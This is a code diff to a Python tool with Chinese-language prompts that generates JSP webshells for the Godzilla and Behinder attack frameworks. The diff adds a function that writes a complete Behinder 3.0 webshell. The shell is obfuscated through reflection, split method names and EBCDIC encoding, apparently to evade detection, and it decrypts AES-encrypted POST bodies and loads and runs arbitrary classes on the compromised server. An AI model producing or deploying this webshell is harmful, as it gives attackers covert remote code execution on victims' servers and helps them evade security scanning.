@@ -3,10 +3,29 @@ import os
 import time
 import ebcdic
 
+def bin_30():
+    key = input("key设置为：(默认为rebeyond)\n")
+    name = input("文件名为：\n")
+    if not name.endswith(".jsp"):
+        name += ".jsp"
+    if os.path.exists(name):
+        exit("文件已存在")
+    if key=="":
+        key = "rebeyond"
+    key = hashlib.md5(key.encode('utf-8')).hexdigest()[:16]
+    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
+    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration>String s="'''+key+'''";class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();public void v(PageContext p,HttpServletRequest r,HttpSession se) throws Exception{if (("PO"+"ST").equals(y.sayHello(HttpServletRequest.class,"getMethod",new Class[]{},r,new Object[]{}))){y.sayHello(HttpSession.class,"setAttr"+"ibute",new Class[]{String.class,Object.class},se,new Object[]{"u",s});Cipher c = (Cipher)y.sayHello(Cipher.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"A"+"ES"});y.sayHello(Cipher.class,"ini"+"t",new Class[]{int.class, java.security.Key.class},c,new Object[]{2,new SecretKeySpec(s.getBytes(),"AE"+"S")});java.io.BufferedReader br = (java.io.BufferedReader)y.sayHello(ServletRequest.class,"getRe"+"ader",new Class[]{},r,new Object[]{});String s1 = (String)y.sayHello(java.io.BufferedReader.class,"read"+"Line",new Class[]{},br,new Object[]{});n(s1,p,c);}}public void n(String s1,PageContext p,Cipher c) throws Exception{byte[] d;try{d = (byte[]) y.sayHello(sun.misc.BASE64Decoder.class,"deco"+"deBuffer",new Class[]{String.class},new sun.misc.BASE64Decoder(),new Object[]{s1});}catch (Exception e){d = (byte[]) y.sayHello(Base64.Decoder.class,"dec"+"ode",new Class[]{String.class},Base64.getDecoder(),new Object[]{s1});}byte[] b = (byte[])y.sayHello(Cipher.class,"doF"+"inal",new Class[]{byte[].class},c,new Object[]{d});Object f = y.sayHello(Class.class,"newIns"+"tance",new Class[]{},new P().O(b),new Object[]{});y.sayHello(Object.class,"equals",new Class[]{Object.class},f,new Object[]{p});}</jsp:declaration><jsp:scriptlet>v(pageContext,request,session);</jsp:scriptlet></jsp:root>'''
+    f = open(name, "wb")
+    path = os.path.abspath(name)
+    f.write(context1.encode("cp037"))
+    f.write(context2.encode("cp290"))
+    f.close()
+    print("生成成功！！！  " + path)
+
 def base():
-    key = input("key设置为\n")
-    pa = input("pass设置为\n")
-    name = input("文件名为\n")
+    key = input("key设置为：\n")
+    pa = input("pass设置为：\n")
+    name = input("文件名为：\n")
     if not name.endswith(".jsp"):
         name += ".jsp"
     if os.path.exists(name):
@@ -24,8 +43,8 @@ def base():
     print("生成成功！！！  " + path)
 
 def raw():
-    key = input("key设置为\n")
-    name = input("文件名为\n")
+    key = input("key设置为：\n")
+    name = input("文件名为：\n")
     if not name.endswith(".jsp"):
         name += ".jsp"
     if os.path.exists(name):
@@ -44,11 +63,13 @@ def raw():
 
 
 if __name__ == '__main__':
-    tp = input("请输入对应的类型（数字）：1.JAVA_AES_BASE664  2.JAVA_AES_RAW\n")
+    tp = input("请输入对应的类型（数字）：1.Godzilla_JAVA_AES_BASE664  2.Godzilla_JAVA_AES_RAW  3.Behinder3.0_SHELL\n")
     if tp == "1":
         base()
     elif tp == "2":
         raw()
+    elif tp == "3":
+        bin_30()
     else:
         print("??????")
     time.sleep(10)
